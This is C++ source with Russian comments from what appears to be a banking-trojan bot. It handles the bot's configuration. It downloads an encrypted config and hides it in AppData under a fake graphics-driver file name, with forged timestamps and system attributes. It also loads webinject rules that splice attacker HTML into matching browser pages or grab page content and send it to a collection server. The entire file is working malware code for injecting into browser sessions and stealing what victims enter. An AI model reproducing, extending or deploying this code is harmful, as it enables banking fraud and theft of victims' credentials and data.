#include <windows.h>
#include <shlobj.h>

#include "BotConfig.h"
#include "GetApi.h"
#include "Strings.h"
#include "Memory.h"
#include "Utils.h"
#include "Config.h"
#include "Crypt.h"
#include "BotUtils.h"
#include "Loader.h"

#include "Modules.h"

#include "BotMonitorMsg.h"

// ---------------------------------------------------------------------------

#include "BotDebug.h"

namespace CONFIGDEBUGSTRINGS
{
	#include "DbgTemplates.h"
}

// Объявляем шаблон вывода отладочных строк
#define CFGDBG CONFIGDEBUGSTRINGS::DBGOutMessage<>

// ---------------------------------------------------------------------------

bool bHttp;
bool bHttps;

//**********************************************************
//  Глобальная переменная, настройки бота из конфигура-
//  ционного файла
//**********************************************************
TBotConfig* BotConfig;

DWORD BotConfigPID = 0; // PID Процесса в котором загружался конфиг



#ifdef BV_APP
LPVOID InjectEventData; // Данные для вызова события
THTMLInjectEvent InjectEvent; // Обработчик события HTML инжекта

void SetHTMLInjectEvent(LPVOID Data, THTMLInjectEvent Event) {
	// функция устанавливает обработчик события для инжекта HTML
	InjectEventData = Data;
	InjectEvent = Event;
}

void CallHTMLInjectEvent(LPVOID Sender, THTMLInjectEventID ID, LPVOID Reserved)
{
	// Вызываем событие инжекта
	if (InjectEvent != NULL) {
		InjectEvent(InjectEventData, Sender, ID, Reserved);
	}
}
#endif

void GetCurrentConfigHostSetings(bool * http, bool * https)
{
	*http = bHttp;
	*https = bHttps;
}

PCHAR FgrHostFromCfg = NULL; // 1
PCHAR GraHostFromCfg = NULL; // 2
PCHAR ScrHostFromCfg = NULL; // 3
PCHAR SniHostFromCfg = NULL; // 4
PCHAR PluginsHostFromCfg = NULL; // 5
DWORD TimeOut = 70;


// ----------------------------------------------------------------------------


void HTMLInjectSetVariableValue(THTMLInjectData *Data, const char* Variable, const char* Value)
{
	// Функция заменяет знасение переменной
	Data->Before.Replace(Variable, Value);
	Data->Inject.Replace(Variable, Value);
	Data->After.Replace(Variable, Value);
}


void HTMLInjectSetSystemVariables(THTMLInjectData *Data)
{
	// Функция меняет идендификатор бота на его значение

	if (Data == NULL) return;

    const static char VariableBotID[] = {'%', 'b', 'o', 't', '_', 'i', 'd', '%', 0};
    const static char VariableDebug[] = {'%','d','e','b','u','g','%', 0};

	PCHAR BotID = GenerateBotID();
	#ifdef DEBUGCONFIG
	PCHAR IsDebug = "true";
	#else
	PCHAR IsDebug = "false";
	#endif


	HTMLInjectSetVariableValue(Data, VariableBotID, BotID);
    HTMLInjectSetVariableValue(Data, VariableDebug, IsDebug);

	STR::Free(BotID);
}

// ----------------------------------------------------------------------------


PCHAR ReadStrBlock_(PCHAR &Buf)
{
	// Функция читаем строку из буфера и смещает указатель за строку
	// формат буфера (DWORD - Длина строки)(Строка)
	DWORD Size = *(DWORD*)Buf;
	Buf += sizeof(DWORD);
	if (Size == 0)
		return NULL;
	PCHAR Str = STR::New(Buf, Size);
	Buf += Size;
	return Str;
}

void ReadStrBlock_(PCHAR &Buf, string &Out)
{
	// Функция читаем строку из буфера и смещает указатель за строку
	// формат буфера (DWORD - Длина строки)(Строка)
	DWORD Size = *(DWORD*)Buf;
	Buf += sizeof(DWORD);
	if (Size == 0) return;

	Out.Copy(Buf, 0, Size);

	Buf += Size;
}



bool DoLoadConfigFromFileEx(TBotConfig* Config, PWCHAR FileName)
{

	// Загрухить конфигурационный файл

	Config->HTMLInjects->Clear();

	CFGDBG("BotConfig", "Загружаем файл");

	HANDLE File = (HANDLE)pCreateFileW(FileName, GENERIC_READ, FILE_SHARE_READ,
		0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);

	if (File == INVALID_HANDLE_VALUE)
	{
		CFGDBG("BotConfig", "Ошибка загрузки файла!");
		return false;
	}

	DWORD ID = 0;
	DWORD h = 0;
	DWORD FileSize = (DWORD)pGetFileSize(File, &h);
	LPBYTE FileBuf = (LPBYTE)MemAlloc(FileSize + 1);
	if (FileBuf == NULL)
	{
		pCloseHandle(File);
		return false;
	}

	m_memset(FileBuf, 0, FileSize + 1);

	DWORD Readed = 0;
	if (!pReadFile(File, FileBuf, FileSize, &Readed, NULL))
	{
		MemFree(FileBuf);
		pCloseHandle(File);
		return false;
	}


	// Проверяем фвляется ли файл конфигом

	if (!Config::IsConfig((PCHAR)FileBuf))
	{
		PCHAR Password = GetMainPassword();
		RC2Crypt::Decode(Password, (PCHAR)FileBuf, FileSize);
		STR::Free(Password);

		if (!Config::IsConfig((PCHAR)FileBuf))
		{
			MemFree(FileBuf);
			pCloseHandle(File);
			return false;
        }
	}

	// Читаем данные
	PCHAR Buf = (PCHAR)XORCrypt::DecodeBuffer
		((PCHAR)ConfigSignature, FileBuf, Readed);
	if (Buf == NULL)
	{
		pCloseHandle(File);
		return false;
	}

	// Пропускаем один устаревший параметр размером один байт
	Buf++;

	// определяем количество масок
	DWORD Count = *(DWORD*)Buf;
	Buf += sizeof(DWORD);

	// Загружаем информацию о хостах

	FgrHostFromCfg = ReadStrBlock_(Buf);
	GraHostFromCfg = ReadStrBlock_(Buf);
	ScrHostFromCfg = ReadStrBlock_(Buf);
	SniHostFromCfg = ReadStrBlock_(Buf);
	PluginsHostFromCfg = ReadStrBlock_(Buf);

	// Период обновления конфига
	TimeOut = *(DWORD*)Buf;
	Buf += sizeof(DWORD);

	// ------------- Настройки протоколов -------------//
	bHttp = *Buf != 0;
	Buf++;

	bHttps = *Buf != 0;
	Buf++;

	// ------------- Загружаем данные инжектов -------------//
	THTMLInject *Inject;
	THTMLInjectData *Data;
	DWORD DataCount;
	DWORD Mode;

	for (DWORD i = 0; i < Count; i++)
	{
		Inject = Config->HTMLInjects->AddInject();
		if (Inject == NULL)
			break;

		ID++;
		Inject->ID = ID;
		// Читаем маску инжекта
		Inject->URL = ReadStrBlock_(Buf);

		// Читаем режимы обработки
		Mode = *(DWORD*)Buf;
		Buf += sizeof(DWORD);

		// Декодируем старую версию флага
		Inject->GET = (Mode == 1 || Mode == 3 || Mode == 4 || Mode == 6);
		Inject->POST = (Mode == 2 || Mode == 3 || Mode == 5 || Mode == 6);
		Inject->IsLog = (Mode <= 3);

		DataCount = *(DWORD*)Buf;
		Buf += sizeof(DWORD);

		for (DWORD j = 0; j < DataCount; j++)
		{
			Data = Inject->AddData();
			if (Data == NULL)
				break;

			ID++;
			Data->ID = ID;
			ReadStrBlock_(Buf, Data->Before);
			ReadStrBlock_(Buf, Data->Inject);
			ReadStrBlock_(Buf, Data->After);

//			Data->Before = ReadStrBlock_(Buf);
//			Data->Inject = ReadStrBlock_(Buf);
//			Data->After = ReadStrBlock_(Buf);

			if (!Data->Before.IsEmpty())
				Data->MacrosHash = Data->Before.Hash();
				;

			// В рабочем боте подменяем переменные в момент загрузки конфига
			#ifndef BV_APP
				HTMLInjectSetSystemVariables(Data);
			#endif

		}
	}
	MemFree(FileBuf);

	// Получаем время изменения файла
//	FILETIME Tm;
//	pGetFileTime(File, &Tm, &Tm, &Config->ConfigTime);

	// -------------------------------
	pCloseHandle(File);

	CFGDBG("BotConfig", "Файл загружен");

	// Сохраняем имя последнего загруженного файла
//	Config->LastConfigFile = WSTR::New(FileName);

	return true;
}
// ----------------------------------------------------------------------------

//bool Config::LoadConfigFromFile(TBotConfig *Config, PWCHAR FileName)
//{
//	// Загружаем файл конфига
//	if (BotConfig == NULL || WSTR::IsEmpty(FileName))
//		return false;
//	pEnterCriticalSection(&Config->Lock);
//
//
//	bool Result = DoLoadConfigFromFileEx(Config, FileName);
//
//	pLeaveCriticalSection(&Config->Lock);
//
//	#ifdef BOTMONITOR
//		if (Result)
//		{
//        	PCHAR FN = WSTR::ToAnsi(FileName, 0);
//			MONITOR_MSG(BMCONST(ConfigLoadFile), FN);
//			STR::Free(FN);
//		}
//	#endif
//
//	return Result;
//
//}

// ----------------------------------------------------------------------------
//void CheckConfigUpdates(PBotConfig Config)
//{
//	// Функция проверяет на необходимость перезагрузки конфига
//	// Код написан с учётом того, что функция будет вызвана
//	// в критической секции
//#ifndef BV_APP
//	if (Config->LastConfigFile == NULL)
//		return;
//
//	HANDLE File = (HANDLE)pCreateFileW(Config->LastConfigFile, GENERIC_WRITE, FILE_SHARE_READ,
//		0, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0);
//
//	if (File == INVALID_HANDLE_VALUE)
//		return;
//
//
//	FILETIME Tm, WT;
//	GetFileTime(File, &Tm, &Tm, &WT);
//	bool NeedUpdate = Config->ConfigTime.dwLowDateTime != WT.dwLowDateTime ||
//                      Config->ConfigTime.dwHighDateTime != WT.dwHighDateTime;
//
//	pCloseHandle(File);
//
//	if (NeedUpdate)
//	{
//    	PWCHAR FN = WSTR::New(Config->LastConfigFile);
//		CFGDBG("BotConfig", "Файл конфига изменился. Обновляем.");
//		DoLoadConfigFromFileEx(Config, FN);
//		WSTR::Free(FN);
//	}
//#endif
//}

// ----------------------------------------------------------------------------

void FreeHTMLInjectData(LPVOID Data)
{
	// Уничтожить данные HTML инжекта
	delete (THTMLInjectData*)Data;
}

void HTMLInjects::FreeInject(THTMLInject *Inject)
{
	if (Inject == NULL)
		return;

	if (Inject->RefCount > 0)
	{
		Inject->DestroyAfterRelease = true;
		return;
	}

	delete Inject;
}


// ----------------------------------------------------------------------------
void HTMLInjects::ReleaseInjectsList(PList List)
{
	// Фуекция освобождает список инжектов
	// которые были выделены для запроса
	if (List == NULL)
		return;

	TBotConfig* Config = Config::GetConfig();
	if (Config)
		Config->HTMLInjects->ReleaseInjects(List);
}

// ----------------------------------------------------------------------------

//PBotConfig Config::Create()
//{
//	PBotConfig C = CreateStruct(TBotConfig_);
//	if (C == NULL)
//		return NULL;
//	C->HTMLInjects = new THTMLInjectList();
//	pInitializeCriticalSection(&C->Lock);
//	return C;
//}
// ----------------------------------------------------------------------------

//void Config::Free(PBotConfig Cfg)
//{
//	// Функция уничтожает структуру конфига
//	if (Cfg == NULL)
//		return;
//	Clear(Cfg);
//	List::Free(Cfg);
////	pDeleteCriticalSection(&Cfg->Lock);
//	FreeStruct(Cfg);
//}

// ----------------------------------------------------------------------------

bool ConfigDoGetInjectsForRequest(TBotConfig* BotConfig, PRequest Request) {
	// Получить инжекты для запроса

	// Собираем ссылку
	PCHAR URL = Request->URL;
	bool DelURL = false;
	if (Request->Optional != NULL) {
		// Добавляем в запрос отправляемые данные
		PCHAR C = NULL;
		if (STR::Scan(Request->Optional, '?') == NULL)
			C = "?";
		URL = STR::New(3, Request->URL, C, Request->Optional);
		DelURL = true;
	}

	// Проверяем инжекты
	DWORD Count = BotConfig->HTMLInjects->Count();
	for (DWORD i = 0; i < Count; i++)
	{
		THTMLInject *Inject = BotConfig->HTMLInjects->Items(i);


		if (Inject->Disabled)
			continue;

		// Сравниваем методы и ссылки
		if ((Request->Method == hmGET && Inject->GET) ||
			(Request->Method == hmPOST && Inject->POST))
			if (CompareUrl(Inject->URL.t_str(), URL))
			{
				Inject->Used = true;

				#ifdef BV_APP
					CallHTMLInjectEvent(Inject, injMaskFinded, NULL);
				#endif

				#ifdef BOTMONITOR
					BotMonitor::SendMessage((PCHAR)BotMonitor::ConfigMaskExec, (PCHAR)&Inject->ID, sizeof(Inject->ID));
				#endif

				if (Request->Injects == NULL)
					Request->Injects = List::Create();

				List::Add(Request->Injects, Inject);
				Inject->RefCount++; // Увеличиваем счётчик использований инжекта
				Request->IsInject = true;
			}
	}
	//
	if (DelURL)
		STR::Free(URL);

	return Request->IsInject;
}
//----------------------------------------------------------------------------

bool Config::GetInjectsForRequest(PRequest Request)
{
	TBotConfig* Config = GetConfig();
	if (Config)
		return Config->HTMLInjects->GetInjectsForRequest(Request);
	else
		return false;
}

// ----------------------------------------------------------------------------

bool Config::IsInjectURL(PCHAR URL, THTTPMethod Method)
{
	// Функция проверяет есть ли для указанного адреса инжект
	TBotConfig* Config = GetConfig();
	if (Config)
		return Config->HTMLInjects->IsInjectURL(URL);
	else
		return false;
}
//----------------------------------------------------------------------------


char BOT_CONFIG_NAME[]    = {'\\', 'i', 'g', 'f', 'x', 't', 'r', 'a', 'y', '.', 'd', 'a', 't', 0};
char BOT_CONFIG_NAME_HP[] = {'\\', 'i', 'g', 'f', 'x', 't', 'r', 'a', 'y', 'h', 'p', '.', 'd', 'a', 't',	0 };


//  Принудительно установленное Имя файла конфига
char OtherConfigFileName[MAX_PATH] = "";

//-----------------------------------------------------------------------------

string Config::GetFileName(bool HightPriority)
{
	// Функция возврашает имя файла по умолчанию

	// Пповеряем не установлено ли имя в ручную
	if (!HightPriority  && !AnsiStr::IsEmpty(OtherConfigFileName))
		return OtherConfigFileName;

	// Собираем имя файла
	string FileName(MAX_PATH);

	// Определяем путь
	pSHGetSpecialFolderPathA((HWND)NULL, FileName.t_str(), CSIDL_APPDATA, TRUE);

	FileName.CalcLength();

	if (!FileName.IsEmpty())
	{
		// Собираем полное имя
		FileName += (HightPriority)? BOT_CONFIG_NAME_HP : BOT_CONFIG_NAME;
    }
	return FileName;
}

// ----------------------------------------------------------------------------
void Config::SetFileName(const char *FileName)
{
	// Функция устанавливает имя файла по умолчанию
	OtherConfigFileName[0] = 0;

	DWORD Len = AnsiStr::Length(FileName);
	if (Len && Len < MAX_PATH)
		m_memcpy(OtherConfigFileName, FileName, Len + 1);
}

// ----------------------------------------------------------------------------

bool Config::IsConfig(PCHAR Buf) {
	// Функция возвращает истину если буфер является конфигом
	return StrSame(Buf, (PCHAR)ConfigSignature, true, StrCalcLength(ConfigSignature));
}
// ----------------------------------------------------------------------------

bool Config::Download(PCHAR URL)
{
	if (STR::IsEmpty(URL))
		return false;

	PCHAR Buf = NULL;

	// Загружаем файл
	if (!HTTP::Get(URL, &Buf, NULL))
		return false;

	// Расшифровываем файл
	#ifdef CryptHTTPH
	if (!IsConfig(Buf))
	{
		PCHAR Password = GetMainPassword();
		RC2Crypt::DecodeStr(Password, Buf);
		STR::Free(Password);
	}
	#endif

	bool Result = IsConfig(Buf);

	// Записываем данные в файл
	if (Result)
	{
		string FileName = GetFileName();

		pSetFileAttributesA(FileName.t_str(), FILE_ATTRIBUTE_ARCHIVE);

		File::WriteBufferA(FileName.t_str(), Buf, STR::Length(Buf));

		SetFakeFileDateTime(FileName.t_str());
		pSetFileAttributesA(FileName.t_str(), FILE_ATTRIBUTE_SYSTEM | FILE_ATTRIBUTE_READONLY);
	}

	STR::Free(Buf);

	return Result;
}

// ----------------------------------------------------------------------------

//TBotConfig* Config::Initialize(PWCHAR FileName, bool IsNewApplication, bool DontLoad)
//{
//	// Инициализировать настройки бота
//	if (IsNewApplication)
//	{
//		BotConfig = NULL;
//	}
//
//	if (BotConfig == NULL)
//	{
//		BotConfig = Create();
//		if (!DontLoad)
//		{
//			if (FileName == NULL)
//			{
//				FileName = GetFileName(true);
//				if (!FileExistsW(FileName))
//					FileName = GetFileName();
//			}
//
//			LoadConfigFromFile(BotConfig, FileName);
//		}
//	}
//
//	return BotConfig;
//
//}

// ----------------------------------------------------------------------------
TBotConfig* Config::Initialize(PCHAR FileName)
{
	// Функция инициализирует глобальный класс настроек
	if (IsNewProcess(BotConfigPID))
	{
    	BotConfig = NULL;
	}

	if (BotConfig == NULL)
	{
		// Создаём объект
		BotConfig = new TBotConfig();

		// Загружаем данные из файла
        string FN;
		if (FileExistsA(FileName))
			FN = FileName;
		else
		{
			// Получаем имя файла по умолчанию
			FN = GetFileName(true);
			if (!FileExistsA(FN.t_str()))
			   FN = GetFileName(false);
		}

        BotConfig->LoadFromFile(FN);
	}

    return BotConfig;
}

// ----------------------------------------------------------------------------

TBotConfig* Config::GetConfig()
{
	// Функция возвращает на конфиг бота
	return BotConfig;
}
// ----------------------------------------------------------------------------

//void Config::Clear(PBotConfig Config)
//{
//	// Очистить данне конфига
//	if (Config == NULL)
//		Config = BotConfig;
//	if (Config)
//	{
//		pEnterCriticalSection(&Config->Lock);
//
//		Config->HTMLInjects->Clear();
//
//		WSTR::Free(Config->LastConfigFile);
//		Config->LastConfigFile = NULL;
//		pLeaveCriticalSection(&Config->Lock);
//    }
//}
// ----------------------------------------------------------------------------

bool SubstitudeText2(PCHAR Buffer, PCHAR &NewBuffer, PCHAR Before,
	PCHAR Inject, PCHAR After, DWORD &NewBufLen) {
	// Функция вставляет текст Inject между текстом Before и After
	NewBufLen = 0;
	NewBuffer = NULL;
	if (Buffer == NULL)
		return false;

	bool B = !STR::IsEmpty(Before);
	bool A = !STR::IsEmpty(After);
	bool I = !STR::IsEmpty(Inject);

	bool Valid = (B && I && A) || (B && A) || (B && I) || (I && A);

	if (!Valid)
		return false;

	// Позиция блока Иуащку
	DWORD BStart = 0;
	DWORD BEnd = 0;
	DWORD BLen = 0;
	// Позиция блока After
	DWORD AStart = 0;
	DWORD AEnd = 0;
	DWORD ALen = 0;

	//DWORD BufferLen = StrCalcLength(Buffer);

	PCHAR AfterPtr = NULL;

	// Ищем блок Before
	if (B)
	{
		if (!WildCmp(Buffer, Before, &BStart, &BEnd, &BLen))
			return false;
	}

	// Ищем блок After
	if (A)
	{
		PCHAR BeforePtr = Buffer + BEnd;
		if (!WildCmp(BeforePtr, After, &AStart, &AEnd, &ALen))
			return false;
		AfterPtr = BeforePtr + AStart;
		// Если не указан блок Before то переносим конец блока на начало
		// блока After
		if (!B)
			BEnd = AStart;
	}
	else
		AfterPtr = Buffer + BEnd; // Ставим указатель на конец блока Before

	DWORD InjectLen = StrCalcLength(Inject);
	DWORD AfterLen = StrCalcLength(AfterPtr);

	// Создаём новый буфер
	NewBufLen = BEnd + InjectLen + AfterLen;
	PCHAR Buf = (PCHAR)MemAlloc(NewBufLen + 1);
	if (Buf == NULL)
		return false;

	NewBuffer = Buf;

	// Копируем строки
	m_memcpy(Buf, Buffer, BEnd);
	Buf += BEnd;
	m_memcpy(Buf, Inject, InjectLen);
	Buf += InjectLen;
	m_memcpy(Buf, AfterPtr, AfterLen);
	Buf += AfterLen;
	*Buf = 0;

	return true;
}
// ----------------------------------------------------------------------------

PCHAR GetHTMLLogCode(PCHAR Buffer, THTMLInject *Inject)
{
	// Функция возвращает HTML код согласно настроек инжекта
	if (STR::IsEmpty(Buffer) || Inject == NULL)
		return NULL;

	PStrings S = Strings::Create();
	bool Added = false;
	PCHAR Code;
	PCHAR Tmp;
	DWORD Count = Inject->Count();
	THTMLInjectData *Data;

	for (DWORD i = 0; i < Count; i++)
	{
		Data = Inject->Items(i);
		Code = GetTextBetween(Buffer, Data->Before.t_str(), Data->After.t_str());
		if (Code != NULL)
		{
			Added = true;
			if (!Data->Inject.IsEmpty())
			{
				Tmp = Code;
				Code = STR::New(3, Data->Inject.t_str(), ": ", Tmp);
				STR::Free(Tmp);
			}
			Strings::Add(S, Code, false);

			Data->State = idsOk;

			#ifdef BOTMONITOR
				BotMonitor::SendMessage((PCHAR)BotMonitor::ConfigDataExec, (PCHAR)&Data->ID, sizeof(Data->ID));
			#endif
			// #ifdef BV_APP
			// CallHTMLInjectEvent(Data->Source, injDataHandled, NULL);
			// #endif
		}
	}
	PCHAR Result = NULL;

	if (Added)
		Result = Strings::GetText(S, " ");

	Strings::Free(S);
	return Result;
}

// ----------------------------------------------------------------------------

bool SendHTMLLogToServer(PCHAR Buffer, THTMLInject *Inject, PHTTPSessionInfo Session)
{
	// Функция отправляет блоки HTML на указанный в настройках сервер
	if (Inject == NULL || !Inject->IsLog)
		return false;

	// Получаем необходимые данные
	PCHAR SendBuffer = NULL;

	PCHAR Data = GetHTMLLogCode(Buffer, Inject);

	if (Data == NULL)
		return false;

	DWORD BrowserType = 0;
	PCHAR UserAgent = NULL;
	PCHAR URL = NULL;

	if (Session != NULL) {
		BrowserType = Session->BrowserType;
		UserAgent = Session->UserAgent;

		// Дополняем данные информацией о загружаемом адресе
		if (Session->URL) {
			URL = Session->URL;
			StrConcat(SendBuffer, 3, Session->URL, "|", Data);
			STR::Free(Data);
		}

	}

	if (SendBuffer == NULL)
		SendBuffer = Data;

	DataGrabber::AddData(URL, SendBuffer, UserAgent, BrowserType,
		DATA_TYPE_INJECT, false);

	STR::Free(SendBuffer);

	return true;
}

// ----------------------------------------------------------------------------

bool InjectHTMLCode(PRequest Request, THTMLInject *Inject)
{
	// Метод обрабатывает загруженный HTML документ
	if (Request == NULL || Inject == NULL)
		return false;

	PCHAR NewBuffer = NULL;
	DWORD NewLen = 0;

	DWORD Count = Inject->Count();
	bool Injected; // Признак того, что был произведён хотя-бы один инжект

	PCHAR BotID = GenerateBotID();

	for (DWORD i = 0; i < Count; i++)
	{
		THTMLInjectData *SourceData = Inject->Items(i);

		// Отключенные данные игнорируем
		if (SourceData->Disabled) continue;

		// Перед инжектом копируем данные, т.к. некоторые
		// инжекты могут содержать макросы подмены
		THTMLInjectData *Data = new THTMLInjectData(NULL);
		Data->Copy(*SourceData);

		#ifdef BV_APP
			// Заменяем системмные переменные
			HTMLInjectSetSystemVariables(Data);
		#endif


		Injected  = false;
		NewBuffer = NULL;
		NewLen    = 0;

		if (Data->MacrosHash == 0)
		{
			Data->MacrosHash = Data->Before.Hash();
			SourceData->MacrosHash = Data->MacrosHash;
        }

		if (Data->MacrosHash == HIM_REPLACE_DOCUMENT)
		{
			// Заменяем всё содержимое документа
			Injected = true;
			NewBuffer = Data->Inject.t_str();
            NewLen    = Data->Inject.Length();
		}
		else
		// Инжектим HTML код в документ
		{
			// Перед инжектом проверем не является ли строка
			// строкой в линукс формате

			bool IsLinuxStr = STR::IsLinuxStr((PCHAR)Request->Buffer);
			if (IsLinuxStr)
			{
				Data->Before.ConvertToLinuzFormat();
				Data->Inject.ConvertToLinuzFormat();
				Data->After.ConvertToLinuzFormat();
			}

			// Выполняем подмену текста
			if (SubstitudeText2((PCHAR)Request->Buffer, NewBuffer, Data->Before.t_str(),
					Data->Inject.t_str(), Data->After.t_str(), NewLen))
			{
				Injected = true;
			}
        }


		if (Injected)
		{
        	// Инжект сработал, обрабатываем данные
			Request::SetBuffer(Request, (LPBYTE)NewBuffer, NewLen);

			SourceData->State = idsOk;

			#ifdef BOTMONITOR
				BotMonitor::SendMessage((PCHAR)BotMonitor::ConfigDataExec, (PCHAR)&SourceData->ID, sizeof(SourceData->ID));
			#endif

			#ifdef BV_APP                                               
				CallHTMLInjectEvent(SourceData, injDataHandled, NULL);
			#endif
		}


		delete Data;
	}

	STR::Free(BotID);

	return Injected;

}

// ----------------------------------------------------------------------------

bool HTMLInjects::Execute(PRequest Request, PHTTPSessionInfo Session) {
	// Обработать HTML инжекты.
	//
	// функция возвращает истину если в буффер
	// запроса были внесены изменения

	if (Request == NULL || !Request->IsInject)
		return false;

	Request->Injected = true; // Устанавливаем признак обработанных инжектов

	bool Result = false;
	THTMLInject *Inject;
	PCHAR NewBuffer;
	DWORD Count = List::Count(Request->Injects);

	for (DWORD i = 0; i < Count; i++) {
		Inject = (THTMLInject*)List::GetItem(Request->Injects, i);
		if (Inject->IsLog)
			SendHTMLLogToServer((PCHAR)Request->Buffer, Inject, Session);
		else {
			// Внедряем свой код в загруженные данные
			NewBuffer = NULL;
			if (InjectHTMLCode(Request, Inject))
				Result = true;
		}

	}
	return Result;
}
// ----------------------------------------------------------------------------

bool CheckContentType(PCHAR CType, PCHAR *Types)
{
	for (int i = 0; Types[i] != NULL; i++)
	{
		if (STR::Pos(CType, Types[i], 0, false) >= 0)
        	return true;
	}
	return false;
}

bool HTMLInjects::SupportContentType(PCHAR CType) {
	// Функция возвращает истину если указанный тип контента
	// поддерживается методами инжекта HTML
	if (CType == NULL)
		return false;
	if (StrSame(CType, "text/", false, 5))
		return true;

	PCHAR Temp;
	bool FreeStr = false;
	if (STR::Scan(CType, ';') != NULL) {
		Temp = STR::GetLeftStr(CType, ";");
		FreeStr = true;
	}
	else
		Temp = CType;

	PCHAR Types[] = {
					  "application/x-javascript",
					  "application/javascript",
					  "application/xml",
					  "application/xhtml+xml",
						NULL};


	bool Result = CheckContentType(Temp, Types);
	if (FreeStr)
		STR::Free(Temp);
	return Result;
}
// ----------------------------------------------------------------------------


//*****************************************************************************
//                              THTMLInjectList
//*****************************************************************************

THTMLInjectList::THTMLInjectList()
{
	FInjects = List::Create();
	pInitializeCriticalSection(&FLock);
}

THTMLInjectList::~THTMLInjectList()
{
	Clear();
	List::Free(FInjects);
}


void THTMLInjectList::Lock()
{
	pEnterCriticalSection(&FLock);
}


void THTMLInjectList::Unlock()
{
	pLeaveCriticalSection(&FLock);
}

THTMLInject* THTMLInjectList::AddInject()
{
	// Функция добавляет новый инжект
    return new THTMLInject(this);
}

void THTMLInjectList::ResetInjectsStatus()
{
	int C = Count();
	for (int i = 0; i < C; i++)
	{
		THTMLInject *Inject = Items(i);
		int DC = Inject->Count();
		for (int j = 0; j < DC; j++)
		{
            Inject->Items(j)->State = idsUnknown;
		}
	}
}

void THTMLInjectList::Clear()
{
	// Функция очищает список инжектов
	for (DWORD i = List::Count(FInjects); i > 0; i--)
		delete (THTMLInject*)List::GetItem(FInjects, i);

}


bool THTMLInjectList::LoadFromMem(LPVOID Buf, DWORD BufSize)
{
	Clear();
	if (Buf == NULL || BufSize == 0)
		return false;
}


void THTMLInjectList::ReleaseInjects(PList Injects)
{
	// Функция освобождает список инжектов
	if (!Injects) return;


	TLock Lock(&FLock);


	for (DWORD i = List::Count(Injects); i > 0; i--)
	{
		THTMLInject *Inject = (THTMLInject*)List::GetItem(Injects, i);
		if (!Inject) break;

//		if (Inject->RefCount > 0)
//			Inject->RefCount--;
//		if (Inject->RefCount == 0 && Inject->DestroyAfterRelease)
//			FreeInject(Inject);

	}

	List::Clear(Injects);

}


bool THTMLInjectList::GetInjectsForURL(THTTPMethod Method, const char *URL, PList List)
{
	// Функция возвращает все инжектты которые подошли для аддреса
	// Если List == NULL то функция прервёт поиск на первом же инжекте
	// и вернёт истину
	if (STRA::IsEmpty(URL)) return false;

    bool Result = false;

	// Входим в критическую секцию
	TLock Lock(&FLock);

	//-----------------------------

	DWORD Cnt = Count();
	for (DWORD i = 0; i < Cnt; i++)
	{
		THTMLInject *Inject = Items(i);

		if (Inject->Disabled) continue;

		// Сравниваем метод
		if (Method != hmUnknown)
		{
			bool Valid = (Method == hmGET && Inject->GET ||
						  Method == hmPOST && Inject->POST);
			if (!Valid) continue;
		}

		// Сравниваем адреса
		if (CompareUrl(Inject->URL.t_str(),  URL))
		{
			Result = true;

			// Проверяется на наличие инжекта для данного адреса
			if (List == NULL) break;

			// Добавляем в список
			Inject->Used = true;

			List::Add(List, Inject);
			Inject->RefCount++; // Увеличиваем счётчик использований инжекта
		}
	}


	return Result;
}


// Функция возвращает инжекты для запроса
bool THTMLInjectList::GetInjectsForRequest(PRequest Request)
{
	if (!Request) return false;

	if (Request->Injects)
		List::Clear(Request->Injects);
	else
		Request->Injects = List::Create();

	// Получаем инжекты адреса
	Request->IsInject = GetInjectsForURL(Request->Method, Request->URL, Request->Injects);
	if (!Request->IsInject)
	{
		List::Free(Request->Injects);
		Request->Injects = NULL;
	}
    return Request->IsInject;
}

// Функция возвращает истину если для указанного адреса есть инжекты
bool THTMLInjectList::IsInjectURL(const char* URL, THTTPMethod Method)
{
	return GetInjectsForURL(Method, URL, NULL);
}


//*****************************************************************************
//                              THTMLInject
//*****************************************************************************


THTMLInject::THTMLInject(THTMLInjectList *aOwner)
{
	FOwner = aOwner;
	if (FOwner)
		List::Add(FOwner->FInjects, this);
	FInjects = List::Create();
}

THTMLInject::~THTMLInject()
{
	if (FOwner)
		List::Remove(FOwner->FInjects, this);
    Clear();
	List::Free(FInjects);
}

THTMLInjectData* THTMLInject::AddData()
{
	return new THTMLInjectData(this);
}

void THTMLInject::Clear()
{
	// Функция очищает список инжектов
	for (DWORD i = List::Count(FInjects); i > 0; i--)
		delete (THTMLInjectData*)List::GetItem(FInjects, i);
}

//*****************************************************************************
//                              THTMLInjectData
//*****************************************************************************

THTMLInjectData::THTMLInjectData(THTMLInject *aOwner)
{
	FOwner = aOwner;
	if (FOwner)
		List::Add(FOwner->FInjects, this);
}

THTMLInjectData::~THTMLInjectData()
{
	if (FOwner)
		List::Remove(FOwner->FInjects, this);
}


void THTMLInjectData::Copy(const THTMLInjectData &Data)
{
	// Функция копирует данные
	Before = Data.Before;
	Inject = Data.Inject;
	After  = Data.After;
	State  = Data.State;
	MacrosHash = Data.MacrosHash;
	Disabled = Data.Disabled;
}


bool THTMLInjectData::IsValid()
{
	// Функция возвращает истину если данные можно использовать
	// в инжектах
	bool B = !Before.IsEmpty();
	bool I = !Inject.IsEmpty();
	bool A = !After.IsEmpty();

	return(B && I && A) || (B && A) || (B && I) || (I && A);

}


//*****************************************************************************
//                                 TBotConfig
//*****************************************************************************
TBotConfig::TBotConfig()
{
	HTMLInjects = new THTMLInjectList();
}


TBotConfig::~TBotConfig()
{
	delete HTMLInjects;
}


void TBotConfig::Clear()
{
	HTMLInjects->Clear();
}



bool TBotConfig::LoadFromFile(const string &FileName)
{
	// Функция загружает настройки из файла
	Clear();

	if (FileName.IsEmpty())
		return false;

	DWORD  BufSize = 0;
	LPBYTE Buf = File::ReadToBufferA(FileName.t_str(), BufSize);
	if (Buf == NULL) return false;

	// Читаем данные HTML инжектов
	HTMLInjects->LoadFromMem(Buf, BufSize);

	// Освобождаем память
	MemFree(Buf);
}


